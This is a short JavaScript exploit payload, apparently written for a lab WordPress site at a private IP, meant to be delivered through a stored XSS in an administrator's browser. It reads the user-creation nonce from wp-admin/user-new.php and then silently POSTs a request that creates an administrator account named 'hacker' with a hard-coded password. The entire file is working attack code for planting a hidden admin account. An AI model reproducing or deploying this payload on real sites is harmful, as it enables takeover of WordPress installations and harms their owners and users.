// This Exploit is desined to create admin user 
// This should be combind with a stored XSS on website so that when admin runs XSS vulnerability this script is loaded
// Since XSS disables SOP we can read response of our XHR request to get "_wpnonce_create-user" value in order to create new user

var wp_nonce = '';
var xhr = new XMLHttpRequest();
xhr.open("GET","http://192.168.44.68:8000/wp-admin/user-new.php");
xhr.withCredentials = true;

xhr.onload = function() {
if (xhr.status >= 200 && xhr.status < 300) {
    // Store the response HTML text in a variable
    var responseHTML = xhr.responseText;
    
    // Now extrace nonce value form this
    // Define the regex pattern to match the value
    var regexPattern = /wpnonce_create-user" value="(.*?)"/;

    // Match the regex pattern against the responseHTML
    var matchResult = responseHTML.match(regexPattern);

    // Check if there's a match
    if (matchResult) {
        // Extracted value will be in matchResult[1]
        wp_nonce = matchResult[1];
        var xhr_admin = new XMLHttpRequest();
        xhr_admin.open("POST","http://192.168.44.68:8000/wp-admin/user-new.php");
        xhr_admin.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        xhr_admin.withCredentials = true;
        xhr_admin.send("action=createuser&_wpnonce_create-user=" + wp_nonce + "&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=hacker&email=hacker%40gmail.com&first_name=&last_name=&url=&pass1=Hacker%404030&pass1-text=Hacker%404030&pass2=Hacker%404030&pw_weak=on&send_user_notification=1&role=administrator&createuser=Add+New+User")
    } else {
        console.log("Value not found in HTML response.");
    }
  }
  else {
    // Request failed
    console.error('Request failed with status code ' + xhr.status);
  }
};
xhr.send();

